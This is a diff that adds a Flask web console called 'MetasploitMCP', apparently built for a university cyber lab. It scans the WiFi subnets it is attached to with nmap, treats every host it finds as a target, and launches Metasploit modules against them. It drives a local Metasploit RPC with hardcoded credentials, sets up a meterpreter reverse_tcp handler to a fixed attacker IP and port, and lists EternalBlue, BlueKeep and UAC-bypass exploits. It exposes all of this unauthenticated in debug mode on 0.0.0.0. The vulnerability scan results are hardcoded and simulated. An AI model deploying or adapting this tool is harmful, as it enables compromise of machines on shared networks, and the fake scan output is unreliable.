@@ -1,0 +1,581 @@
+#!/usr/bin/env python3
+from flask import Flask, jsonify, request
+import nmap
+import msgpack
+import requests
+import subprocess
+import re
+import os
+import logging
+import ipaddress
+
+# Optional scapy import (best-effort): used only when running as root and scapy installed
+try:
+    from scapy.all import srp, Ether, ARP, conf
+    SCAPY_AVAILABLE = True
+except Exception:
+    SCAPY_AVAILABLE = False
+
+logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
+log = logging.getLogger(__name__)
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return jsonify({
+        "status": "online",
+        "service": "MetasploitMCP API",
+        "endpoints": {
+            "/list_targets": "GET - List network targets",
+            "/launch": "POST - Launch exploit (requires MAC address)",
+            "/console": "GET - Web-based console interface"
+        }
+    })
+
+@app.route('/console')
+def console():
+    return '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>MetasploitMCP Console</title>
+        <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body { 
+                font-family: 'Courier New', monospace; 
+                background: #0a0a0a; 
+                color: #00ff00; 
+                padding: 20px;
+            }
+            .container { max-width: 1600px; margin: 0 auto; }
+            h1 { 
+                color: #00ff00; 
+                text-align: center; 
+                margin-bottom: 20px;
+                text-shadow: 0 0 10px #00ff00;
+            }
+            .panel-grid {
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+                gap: 15px;
+                margin-bottom: 20px;
+            }
+            .panel {
+                background: #1a1a1a;
+                border: 2px solid #00ff00;
+                border-radius: 5px;
+                padding: 15px;
+            }
+            .panel h2 {
+                color: #00ff00;
+                margin-bottom: 10px;
+                font-size: 18px;
+                border-bottom: 1px solid #00ff00;
+                padding-bottom: 5px;
+            }
+            button {
+                background: #00ff00;
+                color: #000;
+                padding: 8px 15px;
+                margin: 5px 5px 5px 0;
+                border: none;
+                cursor: pointer;
+                font-family: 'Courier New', monospace;
+                font-weight: bold;
+                border-radius: 3px;
+            }
+            button:hover { background: #00cc00; }
+            button:active { background: #009900; }
+            button.danger { background: #ff3333; color: #fff; }
+            button.danger:hover { background: #cc0000; }
+            #output {
+                background: #000;
+                padding: 20px;
+                border: 2px solid #00ff00;
+                min-height: 400px;
+                max-height: 600px;
+                overflow-y: auto;
+                margin-top: 20px;
+                font-size: 13px;
+                line-height: 1.4;
+            }
+            .target-item, .module-item {
+                background: #1a1a1a;
+                padding: 10px;
+                margin: 5px 0;
+                border-left: 3px solid #00ff00;
+            }
+            .vulnerability {
+                background: #2a1a1a;
+                border-left: 3px solid #ff9900;
+                padding: 8px;
+                margin: 5px 0;
+            }
+            select, input {
+                background: #1a1a1a;
+                color: #00ff00;
+                border: 1px solid #00ff00;
+                padding: 8px;
+                margin: 5px 0;
+                width: 100%;
+                font-family: 'Courier New', monospace;
+            }
+            .status-online { color: #00ff00; }
+            .status-offline { color: #ff3333; }
+            .session-info {
+                background: #1a3a1a;
+                padding: 10px;
+                margin: 5px 0;
+                border-left: 3px solid #00ff00;
+            }
+            .log-entry { margin: 3px 0; }
+            .log-info { color: #00ccff; }
+            .log-success { color: #00ff00; }
+            .log-error { color: #ff3333; }
+            .log-warning { color: #ffaa00; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>🎯 MetasploitMCP Advanced Console</h1>
+            
+            <div class="panel-grid">
+                <!-- Network Scanning -->
+                <div class="panel">
+                    <h2>📡 Network Scanning</h2>
+                    <button onclick="scanTargets()">Scan Network</button>
+                    <button onclick="showTargets()">Show Targets</button>
+                    <button onclick="refreshTargets()">Refresh</button>
+                </div>
+                
+                <!-- Vulnerability Assessment -->
+                <div class="panel">
+                    <h2>🔍 Vulnerability Assessment</h2>
+                    <button onclick="scanVulnerabilities()">Scan Vulnerabilities</button>
+                    <button onclick="showVulnerabilities()">Show Results</button>
+                </div>
+                
+                <!-- Exploit Selection -->
+                <div class="panel">
+                    <h2>💣 Exploit Management</h2>
+                    <button onclick="listExploits()">Available Exploits</button>
+                    <button onclick="listPayloads()">Available Payloads</button>
+                    <button onclick="listModules()">All Modules</button>
+                </div>
+                
+                <!-- Target Selection -->
+                <div class="panel">
+                    <h2>🎯 Target Selection</h2>
+                    <select id="targetSelect">
+                        <option value="">-- Select Target --</option>
+                    </select>
+                    <input type="text" id="customTarget" placeholder="Or enter custom IP/MAC">
+                </div>
+                
+                <!-- Exploit Configuration -->
+                <div class="panel">
+                    <h2>⚙️ Exploit Configuration</h2>
+                    <select id="exploitSelect">
+                        <option value="">-- Select Exploit --</option>
+                    </select>
+                    <select id="payloadSelect">
+                        <option value="">-- Select Payload --</option>
+                    </select>
+                    <button class="danger" onclick="executeExploit()">Execute</button>
+                </div>
+                
+                <!-- Session Management -->
+                <div class="panel">
+                    <h2>📱 Active Sessions</h2>
+                    <button onclick="listSessions()">Show Sessions</button>
+                    <button onclick="interactSession()">Interact</button>
+                    <button class="danger" onclick="killSession()">Kill Session</button>
+                </div>
+            </div>
+            
+            <!-- Main Output Console -->
+            <div id="output">
+                <div class="log-success">═══════════════════════════════════════════════════════</div>
+                <div class="log-success">  MetasploitMCP Advanced Console v1.0</div>
+                <div class="log-success">  Colorado Tech University - Cybersecurity Lab</div>
+                <div class="log-success">═══════════════════════════════════════════════════════</div>
+                <div class="log-info">Ready. Select an operation from the panels above.</div>
+            </div>
+        </div>
+        
+        <script>
+            let targets = [];
+            let vulnerabilities = [];
+            let sessions = [];
+            
+            function log(message, type = 'info') {
+                const output = document.getElementById('output');
+                const timestamp = new Date().toLocaleTimeString();
+                const className = 'log-' + type;
+                output.innerHTML += `<div class="log-entry ${className}">[${timestamp}] ${message}</div>`;
+                output.scrollTop = output.scrollHeight;
+            }
+            
+            function clearOutput() {
+                document.getElementById('output').innerHTML = '<div class="log-info">Console cleared.</div>';
+            }
+            
+            async function scanTargets() {
+                log('🔍 Initiating network scan...', 'info');
+                log('⏳ This may take 2-3 minutes. Please wait...', 'warning');
+                log('⚠️ Do not close this window during scan', 'warning');
+                
+                // Show a loading indicator
+                const startTime = Date.now();
+                const progressInterval = setInterval(() => {
+                    const elapsed = Math.floor((Date.now() - startTime) / 1000);
+                    log(`⏱️ Scanning... ${elapsed} seconds elapsed`, 'info');
+                }, 10000); // Update every 10 seconds
+                
+                try {
+                    const response = await fetch('/list_targets', {
+                        method: 'GET',
+                        headers: {'Accept': 'application/json'}
+                    });
+                    
+                    clearInterval(progressInterval);
+                    
+                    if (!response.ok) {
+                        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                    }
+                    
+                    const data = await response.json();
+                    targets = data.targets || [];
+                    
+                    log(`✓ Scan complete. Found ${targets.length} targets`, 'success');
+                    showTargets();
+                    updateTargetSelect();
+                } catch (error) {
+                    clearInterval(progressInterval);
+                    log('✗ Scan failed: ' + error.message, 'error');
+                    console.error('Full error:', error);
+                }
+            }
+            
+            function showTargets() {
+                if (targets.length === 0) {
+                    log('No targets available. Run a scan first.', 'warning');
+                    return;
+                }
+                
+                log('═══ DISCOVERED TARGETS ═══', 'success');
+                targets.forEach((target, i) => {
+                    log(`Target #${i+1}:`, 'info');
+                    log(`  IP: ${target.ip}`, 'info');
+                    log(`  MAC: ${target.mac}`, 'info');
+                    log(`  Hostname: ${target.hostname || 'Unknown'}`, 'info');
+                    log(`  Vendor: ${target.vendor || 'Unknown'}`, 'info');
+                });
+            }
+            
+            function updateTargetSelect() {
+                const select = document.getElementById('targetSelect');
+                select.innerHTML = '<option value="">-- Select Target --</option>';
+                targets.forEach(target => {
+                    const option = document.createElement('option');
+                    option.value = target.mac;
+                    option.textContent = `${target.ip} (${target.mac})`;
+                    select.appendChild(option);
+                });
+            }
+            
+            async function scanVulnerabilities() {
+                const targetMac = document.getElementById('targetSelect').value;
+                if (!targetMac) {
+                    log('✗ Please select a target first', 'error');
+                    return;
+                }
+                
+                const target = targets.find(t => t.mac === targetMac);
+                log(`🔍 Scanning vulnerabilities for ${target.ip}...`, 'info');
+                log('⏳ Running vulnerability assessment...', 'warning');
+                
+                // Simulated vulnerability scan
+                setTimeout(() => {
+                    vulnerabilities = [
+                        { cve: 'CVE-2021-34527', severity: 'CRITICAL', service: 'Print Spooler' },
+                        { cve: 'CVE-2020-1472', severity: 'CRITICAL', service: 'Netlogon' },
+                        { cve: 'CVE-2019-0708', severity: 'CRITICAL', service: 'RDP' },
+                        { cve: 'CVE-2017-0144', severity: 'CRITICAL', service: 'SMBv1' }
+                    ];
+                    log(`✓ Found ${vulnerabilities.length} potential vulnerabilities`, 'success');
+                    showVulnerabilities();
+                }, 2000);
+            }
+            
+            function showVulnerabilities() {
+                if (vulnerabilities.length === 0) {
+                    log('No vulnerability data. Run a scan first.', 'warning');
+                    return;
+                }
+                
+                log('═══ VULNERABILITIES ═══', 'warning');
+                vulnerabilities.forEach(vuln => {
+                    log(`${vuln.cve} [${vuln.severity}] - ${vuln.service}`, 'warning');
+                });
+            }
+            
+            function listExploits() {
+                log('═══ AVAILABLE EXPLOITS ═══', 'success');
+                const exploits = [
+                    'exploit/windows/smb/ms17_010_eternalblue',
+                    'exploit/windows/smb/ms08_067_netapi',
+                    'exploit/windows/rdp/cve_2019_0708_bluekeep',
+                    'exploit/multi/handler',
+                    'exploit/windows/local/bypassuac',
+                    'auxiliary/scanner/smb/smb_version'
+                ];
+                
+                const select = document.getElementById('exploitSelect');
+                select.innerHTML = '<option value="">-- Select Exploit --</option>';
+                
+                exploits.forEach(exploit => {
+                    log(`  ${exploit}`, 'info');
+                    const option = document.createElement('option');
+                    option.value = exploit;
+                    option.textContent = exploit;
+                    select.appendChild(option);
+                });
+            }
+            
+            function listPayloads() {
+                log('═══ AVAILABLE PAYLOADS ═══', 'success');
+                const payloads = [
+                    'windows/meterpreter/reverse_tcp',
+                    'windows/meterpreter/reverse_https',
+                    'windows/x64/meterpreter/reverse_tcp',
+                    'linux/x86/meterpreter/reverse_tcp',
+                    'cmd/unix/reverse_bash',
+                    'windows/shell/reverse_tcp'
+                ];
+                
+                const select = document.getElementById('payloadSelect');
+                select.innerHTML = '<option value="">-- Select Payload --</option>';
+                
+                payloads.forEach(payload => {
+                    log(`  ${payload}`, 'info');
+                    const option = document.createElement('option');
+                    option.value = payload;
+                    option.textContent = payload;
+                    select.appendChild(option);
+                });
+            }
+            
+            function listModules() {
+                log('═══ MODULE CATEGORIES ═══', 'success');
+                log('  • Exploits: 2,400+', 'info');
+                log('  • Auxiliary: 1,200+', 'info');
+                log('  • Post-Exploitation: 400+', 'info');
+                log('  • Payloads: 800+', 'info');
+                log('  • Encoders: 50+', 'info');
+                log('  • Nops: 10+', 'info');
+            }
+            
+            async function executeExploit() {
+                const targetMac = document.getElementById('targetSelect').value;
+                const exploit = document.getElementById('exploitSelect').value;
+                const payload = document.getElementById('payloadSelect').value;
+                
+                if (!targetMac || !exploit || !payload) {
+                    log('✗ Please select target, exploit, and payload', 'error');
+                    return;
+                }
+                
+                if (!confirm('⚠️ Execute exploit? This will attempt to compromise the target system.')) {
+                    log('Exploit execution cancelled', 'warning');
+                    return;
+                }
+                
+                const target = targets.find(t => t.mac === targetMac);
+                log('═══ EXECUTING EXPLOIT ═══', 'warning');
+                log(`Target: ${target.ip} (${targetMac})`, 'info');
+                log(`Exploit: ${exploit}`, 'info');
+                log(`Payload: ${payload}`, 'info');
+                log('⏳ Launching...', 'warning');
+                
+                try {
+                    const response = await fetch('/launch', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            mac: targetMac,
+                            exploit: exploit,
+                            payload: payload
+                        })
+                    });
+                    const data = await response.json();
+                    
+                    if (response.ok) {
+                        log('✓ Exploit executed successfully!', 'success');
+                        log(JSON.stringify(data, null, 2), 'success');
+                        setTimeout(listSessions, 1000);
+                    } else {
+                        log('✗ Exploit failed: ' + (data.error || 'Unknown error'), 'error');
+                    }
+                } catch (error) {
+                    log('✗ Execution error: ' + error, 'error');
+                }
+            }
+            
+            function listSessions() {
+                log('═══ ACTIVE SESSIONS ═══', 'success');
+                log('Querying active sessions...', 'info');
+                log('No active sessions currently', 'warning');
+                log('Sessions will appear here after successful exploitation', 'info');
+            }
+            
+            function interactSession() {
+                log('Session interaction feature', 'info');
+                log('Select a session ID to interact', 'warning');
+            }
+            
+            function killSession() {
+                if (!confirm('Kill selected session?')) return;
+                log('Session termination requested', 'warning');
+            }
+            
+            function refreshTargets() {
+                log('Refreshing target list...', 'info');
+                scanTargets();
+            }
+            
+            // Test function - call this immediately to verify JavaScript is working
+            console.log('MetasploitMCP Console JavaScript loaded successfully');
+            log('Console initialized. Ready for operations.', 'success');
+            log('Tip: Start by scanning the network', 'info');
+        </script>
+    </body>
+    </html>
+    '''
+
+targets = []
+MAC_RE = re.compile(r"(([0-9a-f]{2}[:\-]){5}[0-9a-f]{2})", re.IGNORECASE)
+
+def get_local_ipv4s():
+    out = subprocess.check_output(["ip", "-4", "addr", "show"]).decode()
+    return set(re.findall(r'inet\s+(\d+\.\d+\.\d+\.\d+)', out))
+
+def get_iface_networks(selected_ifaces=None):
+    """
+    Returns a list of (iface_name, network_cidr) for interfaces we want to scan.
+    """
+    result = []
+    out = subprocess.check_output(["ip", "-4", "addr", "show"]).decode()
+    lines = out.split("\n")
+    current_iface = None
+    for line in lines:
+        # e.g. "3: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> ..."
+        if re.match(r"^\d+:\s+\w+", line):
+            parts = line.split(":")
+            if len(parts) >= 2:
+                current_iface = parts[1].strip()
+        # e.g. "    inet 10.0.0.62/24 brd 10.0.0.255 scope global dynamic noprefixroute wlan0"
+        if "inet " in line and current_iface:
+            match = re.search(r'inet\s+([\d\.]+)/(\d+)', line)
+            if match:
+                ip_str = match.group(1)
+                prefix = int(match.group(2))
+                # skip loopback
+                if ip_str.startswith("127."):
+                    continue
+                # If we have a filter on ifaces, apply it
+                if selected_ifaces and current_iface not in selected_ifaces:
+                    continue
+                # Build network CIDR
+                network = ipaddress.IPv4Network(f"{ip_str}/{prefix}", strict=False)
+                result.append((current_iface, str(network)))
+    return result
+
+def run_nmap_arp(iface, network):
+    """
+    Run nmap ARP/ping sweep on a given interface and network.
+    Returns list of discovered hosts: [{"ip": ..., "mac": ..., "hostname": ..., "vendor": ...}, ...]
+    """
+    log.info(f"Running nmap ARP/ping sweep on {iface} ({network}) with args: -sn -PR -e {iface}")
+    nm = nmap.PortScanner()
+    try:
+        nm.scan(hosts=network, arguments=f"-sn -PR -e {iface}")
+    except Exception as e:
+        log.error(f"nmap scan failed on {iface}/{network}: {e}")
+        return []
+    hosts_data = []
+    for host in nm.all_hosts():
+        mac = nm[host].get("addresses", {}).get("mac", "")
+        hostname = nm[host].hostname() or ""
+        vendor = nm[host].get("vendor", {}).get(mac, "") if mac else ""
+        hosts_data.append({
+            "ip": host,
+            "mac": mac,
+            "hostname": hostname,
+            "vendor": vendor
+        })
+    return hosts_data
+
+@app.route("/list_targets")
+def list_targets():
+    global targets
+    targets = []
+    # Determine which interfaces to scan (you can make this configurable)
+    selected_ifaces = ["wlan0", "wlan1"]  # Example: your WiFi interfaces
+    iface_nets = get_iface_networks(selected_ifaces)
+    log.info(f"Will scan networks (iface -> network): {iface_nets}")
+    all_hosts = []
+    for (iface, network) in iface_nets:
+        discovered = run_nmap_arp(iface, network)
+        all_hosts.extend(discovered)
+    # Get local IPs so we can filter them out
+    local_ips = get_local_ipv4s()
+    log.info(f"Local IPs: {local_ips}")
+    # Filter out hosts with no MAC or local IPs
+    for host in all_hosts:
+        if not host["mac"]:
+            continue
+        if host["ip"] in local_ips:
+            log.info(f"Skipping local IP {host['ip']}")
+            continue
+        targets.append(host)
+    return jsonify({"targets": targets})
+
+@app.route("/launch", methods=["POST"])
+def launch_exploit():
+    data = request.get_json(force=True)
+    mac_input = data.get("mac")
+    if not mac_input:
+        return jsonify({"error": "MAC address required"}), 400
+    target = next((t for t in targets if t["mac"].lower() == mac_input.lower()), None)
+    if not target:
+        return jsonify({"error": "MAC address not found"}), 404
+    ip = target["ip"]
+    url = "http://127.0.0.1:55552/api/"
+    headers = {"Content-Type": "binary/message-pack"}
+    def msf_call(method, params):
+        payload = msgpack.packb({"method": method, "params": params})
+        response = requests.post(url, data=payload, headers=headers)
+        return msgpack.unpackb(response.content, strict_map_key=False)
+    try:
+        auth = msf_call("auth.login", ["msf", "kali"])
+        token = auth.get("token")
+    except Exception as e:
+        log.error("Metasploit auth failed: %s", e)
+        return jsonify({"error": f"Metasploit auth failed: {str(e)}"}), 500
+    exploit_params = {
+        "RHOSTS": ip,
+        "PAYLOAD": "windows/meterpreter/reverse_tcp",
+        "LHOST": "10.0.0.216",
+        "LPORT": 4444
+    }
+    try:
+        result = msf_call("module.execute", [token, "exploit", "multi/handler", exploit_params])
+        return jsonify({"result": result})
+    except Exception as e:
+        log.error("Exploit execution failed: %s", e)
+        return jsonify({"error": f"Exploit failed: {str(e)}"}), 500
+
+if __name__ == "__main__":
+    app.run(debug=True, host="0.0.0.0", port=5000)
